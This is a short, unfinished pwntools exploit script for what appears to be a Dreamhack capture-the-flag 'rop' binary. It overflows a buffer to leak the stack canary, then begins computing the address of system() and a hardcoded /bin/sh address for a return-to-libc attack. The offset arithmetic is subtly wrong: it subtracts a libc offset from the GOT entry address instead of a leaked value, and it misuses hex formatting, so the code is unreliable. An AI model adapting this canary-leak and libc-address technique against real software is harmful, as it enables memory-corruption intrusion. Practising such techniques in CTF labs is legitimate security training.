from pwn import *

def slog(name,addr): return success(": ".join([name,hex(addr)]))

p = process("./rop")
#p = remote("host3.dreamhack.games",)
e = ELF("./rop")
libc = ELF("libc-2.27.so")

#Leak Canary
payload = b"A"*0x39
p.sendafter("Buf: ",payload)
p.recvuntil(payload)
cnry = b'\x00'+ p.recvn(7)
slog("Canary", u64(cnry))

read_system = libc.symbols["read"]-libc.symbols["system"]
system = e.got['read']-read_system
binsh = 0x7fffff748698

slog("read",e.got['read'])
slog("libc_base",libc)
slog("system",hex(system))
print(hex(e.got['read']))
print(hex(system))